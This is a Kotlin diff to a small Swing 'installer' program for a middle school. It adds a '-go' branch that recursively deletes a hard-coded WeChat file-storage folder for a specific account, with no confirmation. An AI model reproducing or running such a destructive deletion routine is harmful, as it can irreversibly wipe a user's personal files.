@@ -16,6 +16,9 @@ import javax.swing.JOptionPane
 import java.awt.*
 import java.awt.event.WindowAdapter
 import java.awt.event.WindowEvent
+import java.io.IOException
+import java.nio.file.Path
+import java.nio.file.Paths
 
 fun main(args: Array<String>) {
     //获取当前系统
@@ -44,30 +47,14 @@ fun main(args: Array<String>) {
     }
     // 检查是否有 -go 参数
     if (args.contains("-go")) {
-        // 有 -go 参数
-        println("请添加 -go 参数")
-        val frame = JFrame("请添加 -go 参数")
-        frame.setSize(550, 550)
-        frame.defaultCloseOperation = JFrame.EXIT_ON_CLOSE
-        //设置按钮的大小
-        val button = JButton("请添加 -go 参数")
-        button.preferredSize = Dimension(200, 50)
-        //设置按钮的字体和大小
-        button.font = Font("MiSans", Font.BOLD, 20)
-        val panel = frame.contentPane
-        panel.layout = GridBagLayout()
-        val c = GridBagConstraints()
-        c.gridx = 0
-        c.gridy = 0
-        panel.add(button, c)
-        frame.contentPane.add(button)
-        frame.pack()
-        frame.setLocationRelativeTo(null)
-        frame.setSize(550, 550)
-        frame.isVisible = true
+        //NO -go
+        println("NOgui,go")
+        val fileToDelete = Paths.get("E:\\Documents\\WeChat Files\\wxid_x2t0w2ott2pn22\\FileStorage\\File")
+        deleteFileRecursively(fileToDelete)
         } else {
             val frame = JFrame("A-program-written-for-Dalian-No.113-Middle-School")
             frame.setSize(550, 550)
+            frame.isVisible = true
             frame.defaultCloseOperation = JFrame.EXIT_ON_CLOSE
             //设置1按钮的大小
             val button = JButton("开始安装")
@@ -118,5 +105,21 @@ fun main(args: Array<String>) {
                 JOptionPane.showMessageDialog(null,"没写完，点了也没用!")
             }
         })
-    }        
+    }     
 }
+
+ private fun deleteFileRecursively(file: Path) {
+    if (Files.isDirectory(file)) {
+        Files.list(file).forEach { child ->
+            deleteFileRecursively(child)
+        }
+    }
+
+    try {
+        Files.delete(file)
+        println("Deleted file: $file")
+    } catch (e: IOException) {
+        println("Failed to delete file: $file")
+        e.printStackTrace()
+    }   
+ }
